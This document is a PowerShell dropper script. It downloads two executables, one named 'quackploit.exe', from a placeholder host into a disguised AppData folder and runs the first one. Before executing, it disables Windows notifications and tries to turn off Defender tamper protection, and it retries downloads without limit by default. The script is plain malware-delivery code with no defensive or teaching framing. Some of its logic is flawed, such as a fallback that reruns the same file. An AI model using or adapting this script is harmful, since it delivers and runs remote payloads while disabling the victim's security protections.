param(
    [string]$Url = "http://IP-Address/quackploit.exe", # Provide the URL for the first file to download
    [string]$Url2 = "http://IP-Address/second.exe", # Provide the URL for the second file to download
    [string]$Dest = (Join-Path $env:APPDATA "SystemData"), # Provide the destination directory to save downloaded files
    [string]$FileName = "quackploit.exe", # Provide the filename for the first downloaded file
    [string]$FileName2 = "second.exe", # Provide the filename for the second downloaded file
    [string]$ExpectedSha256 = "", # Provide SHA256 hash for integrity check quackploit.exe
    [string]$ExpectedSha2562 = "", # Provide SHA256 hash for integrity check second.exe
    [int]$MaxRetries = 0, # Set to 0 for unlimited retries
    [int]$DelaySeconds = 5 # Delay between retries in seconds
)

# Ensure destination directory exists
New-Item -Path $Dest -ItemType Directory -Force | Out-Null # Ensure destination directory exists
$outPath = Join-Path $Dest $FileName # Full path for the first downloaded file
$outPath2 = Join-Path $Dest $FileName2 # Full path for the second downloaded file

# Disable Windows Notifications
Set-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Explorer" -Name "DisableNotificationCenter" -Type DWord -Value 1
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications" -Name "ToastEnabled" -Type DWord -Value 0

# Disable Windows Defender Tamper Protection
Set-MPPreference -DisableTamperProtection $true

# Function to download a file with retries
function DownloadFile {
    param (
        [string]$Url,
        [string]$OutPath,
        [int]$MaxRetries,
        [int]$DelaySeconds
    )

    # Retry logic
    $attempt = 0
    while ($true) {
        $attempt++
        Try {
            # Download the file
            Invoke-WebRequest -Uri $Url -OutFile $OutPath -UseBasicParsing -ErrorAction Stop
            break # Exit loop on success
        }
        Catch {
            # Increment attempt counter
            if ($MaxRetries -gt 0 -and $attempt -ge $MaxRetries) {
                # Exceeded max retries
                DownloadFile -Url $Url -OutPath $OutPath -MaxRetries $MaxRetries -DelaySeconds $DelaySeconds
            }
            # Wait before retrying
            Start-Sleep -Seconds $DelaySeconds
        }
    }
}

# Download files
DownloadFile -Url $Url -OutPath $outPath -MaxRetries $MaxRetries -DelaySeconds $DelaySeconds
DownloadFile -Url $Url2 -OutPath $outPath2 -MaxRetries $MaxRetries -DelaySeconds $DelaySeconds

# Verify file integrity if expected SHA256 hashes are provided
if ($ExpectedSha256 -ne "") {
    Try {
        $hash = (Get-FileHash -Path $outPath -Algorithm SHA256).Hash.ToLower()
        $hash2 = (Get-FileHash -Path $outPath2 -Algorithm SHA256).Hash.ToLower()
        if ($hash -ne $ExpectedSha256.ToLower()) {
            # Hash mismatch, re-download the file
            Remove-Item -Path $outPath -Force -ErrorAction SilentlyContinue
            DownloadFile -Url $Url -OutPath $outPath -MaxRetries $MaxRetries -DelaySeconds $DelaySeconds
        }
        if ($hash2 -ne $ExpectedSha2562.ToLower()){
            # Hash mismatch, re-download the file
            Remove-Item -Path $outPath2 -Force -ErrorAction SilentlyContinue
            DownloadFile -Url $Url2 -OutPath $outPath2 -MaxRetries $MaxRetries -DelaySeconds $DelaySeconds
        }
    } Catch {
        # Error during hash calculation, re-download the files
        Remove-Item -Path $outPath -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $outPath2 -Force -ErrorAction SilentlyContinue
        DownloadFile -Url $Url -OutPath $outPath -MaxRetries $MaxRetries -DelaySeconds $DelaySeconds
        DownloadFile -Url $Url2 -OutPath $outPath2 -MaxRetries $MaxRetries -DelaySeconds $DelaySeconds
    }
}

Try {
    # Execute the first downloaded file
    & $outPath
} Catch {
    # If execution fails, try executing the second downloaded file
    & $outPath
    Exit 4
}

Exit 0